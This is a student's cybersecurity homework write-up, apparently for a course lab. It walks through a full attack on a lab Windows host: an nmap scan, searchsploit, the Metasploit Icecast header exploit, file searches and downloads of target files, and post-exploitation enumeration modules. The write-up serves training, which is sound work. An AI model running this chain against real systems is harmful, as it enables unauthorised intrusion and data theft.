# **Brian C Williams 17-Penetration II Homework** # 

[Report.docx](https://github.com/bwilliams4428/Cybersecurity-Homework/raw/main/17-Penetration-II-Homework/Report.docx)


You've been provided full access to the network and are getting ping responses from the CEO’s workstation.

Perform a service and version scan using Nmap to determine which services are up and running:

1. Run the Nmap command that performs a service and version scan against the target.

	**Answer: nmap -sV 192.168.0.20**

	![Image of question1](https://github.com/bwilliams4428/Cybersecurity-Homework/blob/main/17-Penetration-II-Homework/images/q1.PNG)

2. From the previous step, we see that the Icecast service is running. Let's start by attacking that service. Search for any Icecast 	      	 exploits:

	Run the SearchSploit commands to show available Icecast exploits.

	**Answer: searchsploit icecast windows**

	![Image of q2](https://github.com/bwilliams4428/Cybersecurity-Homework/blob/main/17-Penetration-II-Homework/images/q2.PNG)

3. Now that we know which exploits are available to us, let's start Metasploit:

	Run the command that starts Metasploit:
	
	**Answer: msfconsole** 

	![Image of q3](https://github.com/bwilliams4428/Cybersecurity-Homework/blob/main/17-Penetration-II-Homework/images/Q3.PNG)

4. Search for the Icecast module and load it for use.
	
	Run the command to search for the Icecast module:

	**Answer: search icecast**

	![Image of q4](https://github.com/bwilliams4428/Cybersecurity-Homework/blob/main/17-Penetration-II-Homework/images/Q4.PNG)

5. Run the command to use the Icecast module:
	
	Note: Instead of copying the entire path to the module, you can use the number in front of it.
        
	**Answer: use exploit/windows/http/icecast_header or use 0**
	
      ![Image of q5](https://github.com/bwilliams4428/Cybersecurity-Homework/blob/main/17-Penetration-II-Homework/images/q5.PNG)

6. Set the RHOST to the target machine.
   
      Run the command that sets the RHOST:
	
      **Answer: set RHOST 192.168.0.20**
	
      ![Image of q6](https://github.com/bwilliams4428/Cybersecurity-Homework/blob/main/17-Penetration-II-Homework/images/q6.PNG)
   
7. Run the Icecast exploit.

  	Run the command that runs the Icecast exploit.

	**Answer: run or exploit**
	
	![Image of q7](https://github.com/bwilliams4428/Cybersecurity-Homework/blob/main/17-Penetration-II-Homework/images/q7.PNG)

8. Run the command that performs a search for the secretfile.txt on the target.

	**Answer**: search -f  *secretfile.txt**
	
	![Image of q8](https://github.com/bwilliams4428/Cybersecurity-Homework/blob/main/17-Penetration-II-Homework/images/q8.PNG)

9. You should now have a Meterpreter session open.
   
      Run the command to performs a search for the recipe.txt on the target:

	**Answer**: search -f *recipe.txt
	
	![Image of q9](https://github.com/bwilliams4428/Cybersecurity-Homework/blob/main/17-Penetration-II-Homework/images/q9.PNG)

	Bonus: Run the command that exfiltrates the recipe*.txt file:

	**Answer:** 	
	
			download c:\\Users\\IEUser\\Documents\\Drinks.recipe.txt
			
			download c:\\Users\\IEUSER\\Documents\\user.secretfile.txt
	
	![Image of bonus](https://github.com/bwilliams4428/Cybersecurity-Homework/blob/main/17-Penetration-II-Homework/images/q10.PNG)
	![Image of bonus](https://github.com/bwilliams4428/Cybersecurity-Homework/blob/main/17-Penetration-II-Homework/images/q12.PNG)

10. You can also use Meterpreter's local exploit suggester to find possible exploits.

	**Answer: run post/multi/recon/local_exploit_suggester**
	
	![Image of q10](https://github.com/bwilliams4428/Cybersecurity-Homework/blob/main/17-Penetration-II-Homework/images/q11.PNG)

Note: The exploit suggester is just that: a suggestion. Keep in mind that the listed suggestions may not include all available exploits.

Bonus

A. Run a Meterpreter post script that enumerates all logged on users.
	
   **Answer: run post/windows/gather/enum_logged_on_users**

   ![Image of bonus1](https://github.com/bwilliams4428/Cybersecurity-Homework/blob/main/17-Penetration-II-Homework/images/B1.PNG)

B. Open a Meterpreter shell and gather system information for the target.
	
   **Answer:** 
   		
		shell
           
   		systeminfo
	
   ![Image of bonus2](https://github.com/bwilliams4428/Cybersecurity-Homework/blob/main/17-Penetration-II-Homework/images/B2.PNG)
	
C. Run the command that displays the target's computer system information:

   **Answer: sysinfo**
	
   ![Image of bonus3](https://github.com/bwilliams4428/Cybersecurity-Homework/blob/main/17-Penetration-II-Homework/images/B3.PNG)


